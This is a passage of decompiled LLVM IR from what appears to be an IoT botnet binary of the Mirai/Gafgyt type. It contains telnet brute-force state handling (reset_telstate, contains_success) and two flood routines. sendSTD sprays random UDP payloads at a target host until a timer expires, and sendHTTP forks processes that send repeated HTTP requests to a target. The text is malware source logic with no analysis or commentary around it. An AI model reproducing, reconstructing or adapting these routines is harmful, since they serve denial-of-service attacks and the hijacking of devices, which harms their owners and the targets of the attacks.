  %v1_804aeb8 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804aeb8, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804aec5:                             ; preds = %dec_label_pc_804ac8a
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v1_804a155, i32* %eax.global-to-local, align 4
  %v2_804aee0 = load i32, i32* %v1_804a158, align 4
  store i32 %v2_804aee0, i32* %eax.global-to-local, align 4
  %v1_804aee2 = add i32 %v2_804aee0, 7
  store i32 %v1_804aee2, i32* @ebx, align 4
  %v1_804aee8 = add i32 %v0_804acd7, 16
  %v2_804aee8 = inttoptr i32 %v1_804aee8 to i32*
  store i32 0, i32* %v2_804aee8, align 4
  %v1_804aeea = inttoptr i32 %stack_var_-624.243 to i32*
  %v2_804aeea = call i32 @__GI_time(i32* %v1_804aeea)
  store i32 %v2_804aeea, i32* %eax.global-to-local, align 4
  %v0_804aef2 = load i32, i32* @ebx, align 4
  %v7_804aef2 = icmp ult i32 %v0_804aef2, %v2_804aeea
  %v1_804aef4 = icmp eq i1 %v7_804aef2, false
  br i1 %v1_804aef4, label %dec_label_pc_804b080, label %dec_label_pc_804aefa

dec_label_pc_804aefa:                             ; preds = %dec_label_pc_804aec5
  %v0_804aeef = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804af16 = inttoptr i32 %v0_804aeef to i32*
  store i32 %v2_804a153, i32* %v3_804af16, align 4
  %v1_804af17 = call i32 @reset_telstate(i32 %stack_var_-624.243)
  store i32 %v1_804af17, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804af24:                             ; preds = %dec_label_pc_804a18c
  store i32 %storemerge45, i32* @ebx, align 4
  %v0_804af27 = load i32, i32* @esp, align 4
  %v1_804af2a = add i32 %v0_804af27, -16
  %v2_804af2a = inttoptr i32 %v1_804af2a to i32*
  store i32 0, i32* %v2_804af2a, align 4
  %v1_804af2c = inttoptr i32 %v6_804a1a2 to i32*
  %v2_804af2c = call i32 @__GI_time(i32* %v1_804af2c)
  %v0_804af39 = load i32, i32* @ebx, align 4
  %v2_804af49 = mul i32 %v0_804af39, 28
  %v1_804af4d = add i32 %v2_804ad09, %v2_804af49
  %v2_804af50 = inttoptr i32 %v1_804af4d to i32*
  store i32 %v2_804af2c, i32* %v2_804af50, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v3_804af68 = inttoptr i32 %v2_804a153 to i32*
  %v4_804af68 = load i32, i32* %v3_804af68, align 4
  store i32 %v4_804af68, i32* %eax.global-to-local, align 4
  %v0_804af6b = load i32, i32* @esp, align 4
  %v1_804af6b = add i32 %v0_804af6b, -4
  %v2_804af6b = inttoptr i32 %v1_804af6b to i32*
  store i32 16384, i32* %v2_804af6b, align 4
  %v1_804af70 = add i32 %v0_804af6b, -8
  %v2_804af70 = inttoptr i32 %v1_804af70 to i32*
  store i32 4, i32* %v2_804af70, align 4
  %v1_804af72 = add i32 %v0_804af6b, -12
  %v2_804af72 = inttoptr i32 %v1_804af72 to i32*
  store i32 ptrtoint ([5 x i8]* @global_var_80557d5.59 to i32), i32* %v2_804af72, align 4
  %v0_804af77 = load i32, i32* %eax.global-to-local, align 4
  %v2_804af77 = add i32 %v0_804af6b, -16
  %v3_804af77 = inttoptr i32 %v2_804af77 to i32*
  store i32 %v0_804af77, i32* %v3_804af77, align 4
  %v4_804af78 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a05c, i32 %v6_804a1a2)
  %v0_804af7d = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804af96 = load i32, i32* %v3_804af68, align 4
  store i32 %v4_804af96, i32* %eax.global-to-local, align 4
  %v1_804af99 = add i32 %v0_804af7d, 12
  %v2_804af99 = inttoptr i32 %v1_804af99 to i32*
  store i32 16384, i32* %v2_804af99, align 4
  %v1_804af9e = add i32 %v0_804af7d, 8
  %v2_804af9e = inttoptr i32 %v1_804af9e to i32*
  store i32 7, i32* %v2_804af9e, align 4
  %v1_804afa0 = add i32 %v0_804af7d, 4
  %v2_804afa0 = inttoptr i32 %v1_804afa0 to i32*
  store i32 ptrtoint ([8 x i8]* @global_var_80557da.60 to i32), i32* %v2_804afa0, align 4
  %v0_804afa5 = load i32, i32* %eax.global-to-local, align 4
  %v3_804afa5 = inttoptr i32 %v0_804af7d to i32*
  store i32 %v0_804afa5, i32* %v3_804afa5, align 4
  %v4_804afa6 = call i32 @__libc_send(i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a05c, i32 %v6_804a1a2)
  %v0_804afae = load i32, i32* bitcast ([415 x i8]** @global_var_80580d4.62 to i32*), align 4
  %v5_804afb8 = inttoptr i32 %v0_804afae to i8*
  %v1_804afbe = and i32 %v0_804afae, -256
  store i32 %v1_804afbe, i32* %eax.global-to-local, align 4
  store i32 %v0_804afae, i32* @edi, align 4
  %v3_804afc7 = call i32 @_strlen(i8* %v5_804afb8)
  store i32 %v3_804afc7, i32* @ebx, align 4
  %v0_804afd0 = load i32, i32* bitcast ([415 x i8]** @global_var_80580d4.62 to i32*), align 4
  store i32 %v0_804afd0, i32* @esi, align 4
  store i32 %v1_804a143, i32* %edx.global-to-local, align 4
  store i32 %v2_804a151, i32* %eax.global-to-local, align 4
  %v4_804afec = load i32, i32* %v3_804af68, align 4
  store i32 %v4_804afec, i32* %eax.global-to-local, align 4
  %v0_804afef = load i32, i32* @esp, align 4
  %v1_804afef = add i32 %v0_804afef, -4
  %v2_804afef = inttoptr i32 %v1_804afef to i32*
  store i32 16384, i32* %v2_804afef, align 4
  %v0_804aff4 = load i32, i32* @ebx, align 4
  %v2_804aff4 = add i32 %v0_804afef, -8
  %v3_804aff4 = inttoptr i32 %v2_804aff4 to i32*
  store i32 %v0_804aff4, i32* %v3_804aff4, align 4
  %v0_804aff5 = load i32, i32* @esi, align 4
  %v2_804aff5 = add i32 %v0_804afef, -12
  %v3_804aff5 = inttoptr i32 %v2_804aff5 to i32*
  store i32 %v0_804aff5, i32* %v3_804aff5, align 4
  %v0_804aff6 = load i32, i32* %eax.global-to-local, align 4
  %v2_804aff6 = add i32 %v0_804afef, -16
  %v3_804aff6 = inttoptr i32 %v2_804aff6 to i32*
  store i32 %v0_804aff6, i32* %v3_804aff6, align 4
  %v5_804aff7 = call i32 @__libc_send(i32 %v0_804afae, i32 %stack_var_-624.243, i32 %stack_var_-620.244, i32 %v2_804a05c)
  store i32 %v5_804aff7, i32* %eax.global-to-local, align 4
  %v0_804affc = load i32, i32* @esp, align 4
  %v2_804afff = icmp slt i32 %v5_804aff7, 0
  %v1_804b001 = icmp eq i1 %v2_804afff, false
  store i32 %v1_804a143, i32* @edx, align 4
  br i1 %v1_804b001, label %dec_label_pc_804b02a, label %dec_label_pc_804b003

dec_label_pc_804b003:                             ; preds = %dec_label_pc_804af24
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804b01f = inttoptr i32 %v0_804affc to i32*
  store i32 %v2_804a153, i32* %v3_804b01f, align 4
  %v2_804b020 = call i32 @reset_telstate(i32 %v0_804afae)
  store i32 %v2_804b020, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804b02a:                             ; preds = %dec_label_pc_804af24
  store i32 %v1_804a155, i32* %eax.global-to-local, align 4
  %v2_804b045 = load i32, i32* %v1_804a158, align 4
  store i32 %v2_804b045, i32* %eax.global-to-local, align 4
  %v1_804b047 = add i32 %v2_804b045, 25
  store i32 %v1_804b047, i32* @ebx, align 4
  %v2_804b04d = inttoptr i32 %v0_804affc to i32*
  store i32 0, i32* %v2_804b04d, align 4
  %tmp39 = inttoptr i32 %v0_804afae to i32*
  %v3_804b04f = call i32 @__GI_time(i32* %tmp39)
  store i32 %v3_804b04f, i32* %eax.global-to-local, align 4
  %v0_804b057 = load i32, i32* @ebx, align 4
  %v7_804b057 = icmp ult i32 %v0_804b057, %v3_804b04f
  %v1_804b059 = icmp eq i1 %v7_804b057, false
  br i1 %v1_804b059, label %dec_label_pc_804b080, label %dec_label_pc_804b05b

dec_label_pc_804b05b:                             ; preds = %dec_label_pc_804b02a
  %v0_804b054 = load i32, i32* @esp, align 4
  store i32 %v1_804a143, i32* @edx, align 4
  store i32 %v2_804a153, i32* %eax.global-to-local, align 4
  %v3_804b077 = inttoptr i32 %v0_804b054 to i32*
  store i32 %v2_804a153, i32* %v3_804b077, align 4
  %v2_804b078 = call i32 @reset_telstate(i32 %v0_804afae)
  store i32 %v2_804b078, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b080

dec_label_pc_804b080:                             ; preds = %dec_label_pc_804a18c, %dec_label_pc_804b02a, %dec_label_pc_804aec5, %dec_label_pc_804aae3, %dec_label_pc_804a85f, %dec_label_pc_804a723, %dec_label_pc_804a3ac, %dec_label_pc_804b003, %dec_label_pc_804aefa, %dec_label_pc_804ae9b, %dec_label_pc_804ade4, %dec_label_pc_804adb8, %dec_label_pc_804ad3d, %dec_label_pc_804ac5e, %dec_label_pc_804ac34, %dec_label_pc_804abd8, %dec_label_pc_804ab18, %dec_label_pc_804aab7, %dec_label_pc_804aa8b, %dec_label_pc_804a9da, %dec_label_pc_804a9b0, %dec_label_pc_804a954, %dec_label_pc_804a894, %dec_label_pc_804a833, %dec_label_pc_804a807, %dec_label_pc_804a758, %dec_label_pc_804a6f9, %dec_label_pc_804a671, %dec_label_pc_804a647, %dec_label_pc_804a511, %dec_label_pc_804a4e7, %dec_label_pc_804a38c, %dec_label_pc_804a34e, %dec_label_pc_804b05b
  %stack_var_-624.1 = phi i32 [ %stack_var_-624.243, %dec_label_pc_804a18c ], [ %stack_var_-624.243, %dec_label_pc_804b02a ], [ %stack_var_-624.243, %dec_label_pc_804b05b ], [ %stack_var_-624.243, %dec_label_pc_804b003 ], [ %stack_var_-624.243, %dec_label_pc_804aec5 ], [ %stack_var_-624.243, %dec_label_pc_804aefa ], [ %stack_var_-624.243, %dec_label_pc_804ae9b ], [ %stack_var_-624.243, %dec_label_pc_804ade4 ], [ %stack_var_-624.243, %dec_label_pc_804adb8 ], [ %stack_var_-624.243, %dec_label_pc_804ad3d ], [ %v4_804ab61, %dec_label_pc_804ac5e ], [ %v4_804ab61, %dec_label_pc_804ac34 ], [ %v4_804ab61, %dec_label_pc_804abd8 ], [ %stack_var_-624.243, %dec_label_pc_804aae3 ], [ %stack_var_-624.243, %dec_label_pc_804ab18 ], [ %stack_var_-624.243, %dec_label_pc_804aab7 ], [ %stack_var_-624.243, %dec_label_pc_804aa8b ], [ %stack_var_-624.243, %dec_label_pc_804a9da ], [ %stack_var_-624.243, %dec_label_pc_804a9b0 ], [ %stack_var_-624.243, %dec_label_pc_804a954 ], [ %stack_var_-624.243, %dec_label_pc_804a85f ], [ %stack_var_-624.243, %dec_label_pc_804a894 ], [ %stack_var_-624.243, %dec_label_pc_804a833 ], [ %stack_var_-624.243, %dec_label_pc_804a807 ], [ %stack_var_-624.243, %dec_label_pc_804a723 ], [ %stack_var_-624.243, %dec_label_pc_804a758 ], [ %stack_var_-624.243, %dec_label_pc_804a6f9 ], [ %stack_var_-624.243, %dec_label_pc_804a671 ], [ %stack_var_-624.243, %dec_label_pc_804a647 ], [ %stack_var_-624.243, %dec_label_pc_804a3ac ], [ %stack_var_-624.243, %dec_label_pc_804a511 ], [ %stack_var_-624.243, %dec_label_pc_804a4e7 ], [ %stack_var_-624.243, %dec_label_pc_804a38c ], [ %stack_var_-624.243, %dec_label_pc_804a34e ]
  %stack_var_-620.1 = phi i32 [ %stack_var_-620.244, %dec_label_pc_804a18c ], [ %stack_var_-620.244, %dec_label_pc_804b02a ], [ %stack_var_-620.244, %dec_label_pc_804b05b ], [ %stack_var_-620.244, %dec_label_pc_804b003 ], [ %stack_var_-620.244, %dec_label_pc_804aec5 ], [ %stack_var_-620.244, %dec_label_pc_804aefa ], [ %stack_var_-620.244, %dec_label_pc_804ae9b ], [ %stack_var_-620.244, %dec_label_pc_804ade4 ], [ %stack_var_-620.244, %dec_label_pc_804adb8 ], [ %stack_var_-620.244, %dec_label_pc_804ad3d ], [ %stack_var_-620.244, %dec_label_pc_804ac5e ], [ %stack_var_-620.244, %dec_label_pc_804ac34 ], [ %stack_var_-620.244, %dec_label_pc_804abd8 ], [ %stack_var_-620.244, %dec_label_pc_804aae3 ], [ %stack_var_-620.244, %dec_label_pc_804ab18 ], [ %stack_var_-620.244, %dec_label_pc_804aab7 ], [ %stack_var_-620.244, %dec_label_pc_804aa8b ], [ %v4_804a8dd, %dec_label_pc_804a9da ], [ %v4_804a8dd, %dec_label_pc_804a9b0 ], [ %v4_804a8dd, %dec_label_pc_804a954 ], [ %stack_var_-620.244, %dec_label_pc_804a85f ], [ %stack_var_-620.244, %dec_label_pc_804a894 ], [ %stack_var_-620.244, %dec_label_pc_804a833 ], [ %stack_var_-620.244, %dec_label_pc_804a807 ], [ %stack_var_-620.244, %dec_label_pc_804a723 ], [ %stack_var_-620.244, %dec_label_pc_804a758 ], [ %stack_var_-620.244, %dec_label_pc_804a6f9 ], [ %stack_var_-620.244, %dec_label_pc_804a671 ], [ %stack_var_-620.244, %dec_label_pc_804a647 ], [ %stack_var_-620.244, %dec_label_pc_804a3ac ], [ %stack_var_-620.244, %dec_label_pc_804a511 ], [ %stack_var_-620.244, %dec_label_pc_804a4e7 ], [ %stack_var_-620.244, %dec_label_pc_804a38c ], [ %stack_var_-620.244, %dec_label_pc_804a34e ]
  %v4_804b080 = add nuw nsw i32 %storemerge45, 1
  store i32 %v4_804b080, i32* %eax.global-to-local, align 4
  %exitcond = icmp eq i32 %v4_804b080, %arg2
  br i1 %exitcond, label %dec_label_pc_804a131, label %dec_label_pc_804a13d

; uselistorder directives
  uselistorder i32 %v4_804b080, { 1, 2, 0 }
  uselistorder i32 %stack_var_-620.1, { 1, 0 }
  uselistorder i32 %stack_var_-624.1, { 1, 0 }
  uselistorder i32 %v0_804af7d, { 3, 0, 1, 2 }
  uselistorder i32 %v0_804ad8f, { 1, 2, 3, 0 }
  uselistorder i32 %v0_804ad36, { 1, 2, 0 }
  uselistorder i32* %v1_804acea, { 2, 1, 0, 3 }
  uselistorder i32 %v0_804ac2d, { 1, 0, 2 }
  uselistorder i32 %v0_804abd1, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804ab61, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804aad3, { 1, 0 }
  uselistorder i32 %v0_804aa84, { 1, 2, 0 }
  uselistorder i32 %v0_804a9a9, { 1, 0, 2 }
  uselistorder i32 %v0_804a94d, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v4_804a8dd, { 0, 2, 4, 5, 3, 6, 1, 7, 8, 9, 10 }
  uselistorder i32* %v2_804a84f, { 1, 0 }
  uselistorder i32 %v0_804a800, { 1, 2, 0 }
  uselistorder i32 %v0_804a6c4, { 1, 0 }
  uselistorder i32 %v13_804a69c, { 1, 0 }
  uselistorder i32 %v0_804a697, { 2, 0, 1 }
  uselistorder i32 %v0_804a5e2, { 0, 1, 6, 2, 3, 4, 5 }
  uselistorder i32 %v5_804a5dd, { 3, 2, 0, 1, 4 }
  uselistorder i32 %v1_804a58d, { 1, 0 }
  uselistorder i32 %v2_804a571, { 1, 0 }
  uselistorder i32 %v0_804a52a, { 1, 0 }
  uselistorder i32 %v0_804a4a5, { 2, 0, 1 }
  uselistorder i32 %v12_804a47d, { 1, 0 }
  uselistorder i32 %v0_804a478, { 2, 0, 1 }
  uselistorder i32 %v2_804a3fa, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 %v0_804a3bf, { 2, 0, 1 }
  uselistorder i32 %v2_804a20c, { 1, 0 }
  uselistorder i32 %v6_804a1a2, { 10, 11, 12, 8, 9, 6, 7, 5, 3, 4, 2, 1, 14, 13, 15, 0 }
  uselistorder i32* %v1_804a158, { 4, 3, 2, 1, 0, 5 }
  uselistorder i32 %v1_804a155, { 4, 3, 2, 1, 0, 5, 6 }
  uselistorder i32 %v2_804a153, { 49, 50, 51, 52, 53, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 33, 34, 35, 36, 37, 27, 28, 29, 30, 31, 32, 22, 23, 24, 25, 26, 16, 17, 18, 19, 20, 21, 8, 9, 10, 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 6, 5, 7, 54 }
  uselistorder i32 %v2_804a151, { 10, 11, 12, 1, 13, 0, 14, 2, 15, 16, 17, 18, 19, 3, 20, 21, 22, 23, 24, 4, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 6, 40, 5, 41, 42, 7, 43, 45, 8, 44, 9 }
  uselistorder i32 %v1_804a143, { 0, 1, 2, 3, 4, 12, 13, 5, 6, 7, 8, 9, 10, 11, 14, 15, 16, 17, 18, 19, 20, 22, 21, 23, 24, 25, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 40, 41, 36, 37, 38, 39, 42, 43, 44, 46, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60 }
  uselistorder i32 %stack_var_-624.243, { 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 15, 10, 8, 6, 5, 4, 0, 3, 2, 1, 9, 7, 14, 16, 13, 12, 11 }
  uselistorder i32 %stack_var_-620.244, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 29, 26, 24, 22, 21, 20, 16, 14, 12, 9, 8, 7, 6, 5, 4, 0, 3, 2, 1, 11, 10, 13, 15, 19, 18, 17, 25, 23, 28, 30, 27 }
  uselistorder i32 %storemerge45, { 0, 3, 4, 5, 6, 8, 7, 1, 2 }
  uselistorder i32 %v4_804a120, { 1, 2, 0 }
  uselistorder i32 %storemerge251, { 1, 0 }
  uselistorder i32 %v2_804a079, { 1, 0 }
  uselistorder i32 %v2_804a05c, { 14, 13, 12, 15, 17, 16, 18, 19, 22, 21, 20, 5, 6, 7, 8, 23, 1, 2, 3, 4, 9, 0, 10, 11 }
  uselistorder i32 %v1_804a008, { 1, 0, 2 }
  uselistorder i32* %stack_var_-604, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-596, { 4, 0, 2, 1, 3, 5, 6, 7 }
  uselistorder i32* %stack_var_-316, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-324, { 2, 1, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-328, { 4, 3, 5, 1, 0, 2, 6, 7 }
  uselistorder i32* %stack_var_-332, { 5, 0, 9, 8, 4, 6, 10, 2, 1, 7, 11, 3, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 40, 41, 42, 43, 44, 45, 46, 47, 48, 39, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63 }
  uselistorder i32* %eax.global-to-local, { 203, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 57, 56, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 78, 79, 82, 80, 81, 83, 84, 77, 85, 86, 87, 88, 89, 90, 92, 91, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 113, 114, 117, 115, 116, 118, 119, 112, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 174, 175, 176, 177, 178, 179, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 180, 195, 197, 198, 199, 200, 201, 202, 196, 204, 205, 218, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 0, 219, 220, 221, 222, 223, 224 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32)* @read_until_response, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8 7, { 1, 0 }
  uselistorder i8 6, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg1, { 4, 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_804b080, { 33, 1, 7, 8, 2, 9, 10, 11, 12, 13, 14, 15, 16, 3, 17, 18, 19, 20, 21, 22, 4, 23, 24, 25, 5, 26, 27, 28, 29, 30, 6, 31, 32, 0 }
  uselistorder label %dec_label_pc_804a18c, { 1, 0 }
  uselistorder label %dec_label_pc_804a13d, { 1, 0 }
  uselistorder label %dec_label_pc_804a131, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804a120, { 2, 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804b0a7 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804b0b7 = call i32 @__GI_time(i32* null)
  %v1_804b0c9 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804b0d4 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804b0f5 = add i32 %v1_804b0c9, 12
  %v2_804b0f5 = inttoptr i32 %v1_804b0f5 to i32*
  %v3_804b0f5 = load i32, i32* %v2_804b0f5, align 4
  %v2_804b0fd = ptrtoint i32* %stack_var_-40 to i32
  %v1_804b103 = add i32 %v1_804b0c9, 16
  %v2_804b103 = inttoptr i32 %v1_804b103 to i32*
  %v3_804b103 = load i32, i32* %v2_804b103, align 4
  %v1_804b106 = inttoptr i32 %v3_804b103 to i32*
  %v2_804b106 = load i32, i32* %v1_804b106, align 4
  %v4_804b10e = call i32 @bcopy(i32 %v2_804b106, i32 %v2_804b0fd, i32 %v3_804b0f5)
  %v1_804b119 = add i32 %v1_804b0c9, 8
  %v2_804b119 = inttoptr i32 %v1_804b119 to i32*
  %v3_804b119 = load i32, i32* %v2_804b119, align 4
  store i32 %v3_804b119, i32* %stack_var_-44, align 4
  %v4_804b144 = bitcast i32* %stack_var_-188 to i16*
  %v5_804b1cf = add i32 %v2_804b0b7, %arg3
  br label %dec_label_pc_804b12e

dec_label_pc_804b12e:                             ; preds = %dec_label_pc_804b1f5, %entry
  %storemerge = phi i32 [ %v4_804b1f5, %dec_label_pc_804b1f5 ], [ 0, %entry ]
  %v5_804b144 = call i32 @memcpy(i16* %v4_804b144, i32 ptrtoint ([36 x i8*]* @global_var_8055980.99 to i32), i32 144)
  store i32 %v5_804b144, i32* @eax, align 4
  %v0_804b14c = call i32 @random()
  %v2_804b15c = udiv i32 %v0_804b14c, 36
  %tmp = mul nsw i32 %v2_804b15c, -4
  %v2_804b179 = add i32 %v0_804b14c, %tmp
  store i32 %v2_804b179, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804b12e.dec_label_pc_804b1f5_crit_edge, label %dec_label_pc_804b197

dec_label_pc_804b12e.dec_label_pc_804b1f5_crit_edge: ; preds = %dec_label_pc_804b12e
  br label %dec_label_pc_804b1f5

dec_label_pc_804b197:                             ; preds = %dec_label_pc_804b12e
  %v0_804b187 = load i32, i32* @ebp, align 4
  %v3_804b187 = add i32 %v0_804b187, -184
  %v2_804b187 = mul i32 %v2_804b179, 4
  %v4_804b187 = add i32 %v3_804b187, %v2_804b187
  %v5_804b187 = inttoptr i32 %v4_804b187 to i32*
  %v6_804b187 = load i32, i32* %v5_804b187, align 4
  %v5_804b1a1 = call i32 @__libc_send(i32 %v4_804b0a7, i32 %v6_804b187, i32 65, i32 0)
  %v4_804b1b5 = call i32 @__libc_connect(i32 %v4_804b0a7, i32 %v2_804b0d4, i32 16)
  %v2_804b1c2 = call i32 @__GI_time(i32* null)
  %v5_804b1d4 = icmp slt i32 %v2_804b1c2, %v5_804b1cf
  br i1 %v5_804b1d4, label %dec_label_pc_804b1f5, label %dec_label_pc_804b1d6

dec_label_pc_804b1d6:                             ; preds = %dec_label_pc_804b197
  %v1_804b1dc = call i32 @__libc_close(i32 %v4_804b0a7)
  %v1_804b1e9 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804b1f5:                             ; preds = %dec_label_pc_804b12e.dec_label_pc_804b1f5_crit_edge, %dec_label_pc_804b197
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804b12e.dec_label_pc_804b1f5_crit_edge ], [ 0, %dec_label_pc_804b197 ]
  %v4_804b1f5 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804b12e

; uselistorder directives
  uselistorder i32 %v2_804b179, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804b0c9, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 1, 0 }
  uselistorder label %dec_label_pc_804b1f5, { 1, 0 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-537 = alloca i32, align 4
  %stack_var_-536 = alloca i32, align 4
  %v0_804b200 = load i32, i32* @edi, align 4
  %v2_804b216 = call i32 @__GI_time(i32* null)
  %v5_804b21e = add i32 %v2_804b216, %arg5
  %v2_804b267 = ptrtoint i32* %stack_var_-536 to i32
  %v4_804b2bc = bitcast i32* %stack_var_-536 to i8*
  store i32 0, i32* @eax, align 4
  %v5_804b32d38 = icmp sgt i32 %arg6, 0
  br i1 %v5_804b32d38, label %dec_label_pc_804b237.lr.ph, label %dec_label_pc_804b333

dec_label_pc_804b237.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_804b237

dec_label_pc_804b237:                             ; preds = %dec_label_pc_804b324, %dec_label_pc_804b237.lr.ph
  %storemerge39 = phi i32 [ 0, %dec_label_pc_804b237.lr.ph ], [ %v4_804b324, %dec_label_pc_804b324 ]
  %v0_804b237 = call i32 @random()
  %v5_804b26e = call i32 @sprintf(i32 %v2_804b267, i32 ptrtoint ([64 x i8]* @global_var_8055a10.138 to i32), i32 %arg1, i32 %arg4)
  %v1_804b276 = call i32 @__libc_fork(i32 %v2_804b267)
  %v1_804b27b = icmp eq i32 %v1_804b276, 0
  br i1 %v1_804b27b, label %dec_label_pc_804b324, label %dec_label_pc_804b304.preheader

dec_label_pc_804b304.preheader:                   ; preds = %dec_label_pc_804b237
  %v2_804b30932 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b30932, i32* @eax, align 4
  %v5_804b31435 = icmp slt i32 %v2_804b30932, %v5_804b21e
  br i1 %v5_804b31435, label %dec_label_pc_804b285, label %dec_label_pc_804b31a

dec_label_pc_804b285:                             ; preds = %dec_label_pc_804b304.preheader, %dec_label_pc_804b304.backedge
  %v3_804b297 = call i32 @socket_connect(i32 %arg2, i16 %arg3)
  %v4_804b2a2 = icmp eq i32 %v3_804b297, 0
  br i1 %v4_804b2a2, label %dec_label_pc_804b304.backedge, label %dec_label_pc_804b2a8

dec_label_pc_804b2a8:                             ; preds = %dec_label_pc_804b285
  store i1 false, i1* @df, align 1
  store i32 %v2_804b267, i32* @edi, align 4
  %v3_804b2c2 = call i32 @_strlen(i8* %v4_804b2bc)
  %v4_804b2d7 = call i32 @__libc_write(i32 %v3_804b297, i32* nonnull %stack_var_-536, i32 %v3_804b2c2)
  %v4_804b2ee = call i32 @__libc_read(i32 %v3_804b297, i32* nonnull %stack_var_-537, i32 1)
  %v1_804b2fc = call i32 @__libc_close(i32 %v3_804b297)
  br label %dec_label_pc_804b304.backedge

dec_label_pc_804b304.backedge:                    ; preds = %dec_label_pc_804b2a8, %dec_label_pc_804b285
  %v2_804b309 = call i32 @__GI_time(i32* null)
  store i32 %v2_804b309, i32* @eax, align 4
  %v5_804b314 = icmp slt i32 %v2_804b309, %v5_804b21e
  br i1 %v5_804b314, label %dec_label_pc_804b285, label %dec_label_pc_804b31a

dec_label_pc_804b31a:                             ; preds = %dec_label_pc_804b304.backedge, %dec_label_pc_804b304.preheader
  %v1_804b31f = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804b324

